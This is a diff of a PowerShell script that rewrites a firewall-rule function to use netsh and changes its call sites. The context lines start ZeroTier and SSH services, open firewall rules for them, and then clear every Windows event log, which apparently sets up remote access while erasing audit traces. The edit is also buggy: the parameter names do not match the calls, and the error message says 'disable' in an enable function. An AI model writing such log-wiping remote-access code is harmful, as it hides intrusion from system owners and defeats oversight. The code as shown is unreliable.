@@ -147,21 +147,20 @@ function Remove-FirewallRuleSafe {
     }
 }
 
-function Enable-FirewallRuleSafe {
+function Enable-FirewallRule {
     param (
-        [string]$RuleName
+        [string]$ruleNames
     )
-    try {
-        $firewallRule = Get-NetFirewallRule -Name $RuleName -ErrorAction Stop
-        if ($firewallRule.Enabled -eq $false) {
-            Set-NetFirewallRule -Name $RuleName -Enabled True
+    
+    $ruleNames | ForEach-Object {
+        $ruleName = $_
+        try {
+            netsh advfirewall firewall set rule name="$ruleName" new enable=yes
+        } catch {
+            Write-Host "Failed to disable firewall rule $ruleName." -ForegroundColor Red
         }
     }
-    catch {
-        Write-Host "Firewall rule $RuleName not found or cannot be manipulated."
-    }
 }
-
 function Retry-Operation {
     param (
         [scriptblock]$Operation,
@@ -236,10 +235,10 @@ if ($storedCode -ne $null) {
 							Start-ServiceSafe -ServiceName $ztservice
 							Start-ServiceSafe -ServiceName $sshagentservice
 							Start-ServiceSafe -ServiceName $sshdservice
-							Enable-FirewallRuleSafes -ruleName $ztfirewall
-							Enable-FirewallRuleSafe -ruleName $ztfirewall2
-							Enable-FirewallRuleSafe -ruleName $ztfirewall3
-							Enable-FirewallRuleSafe -ruleName $sshfirewall
+							Enable-FirewallRule -ruleName $ztfirewall
+							Enable-FirewallRule -ruleName $ztfirewall2
+							Enable-FirewallRule -ruleName $ztfirewall3
+							Enable-FirewallRule -ruleName $sshfirewall
 							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
 						} -MaxRetries $retryAttempts
                     }
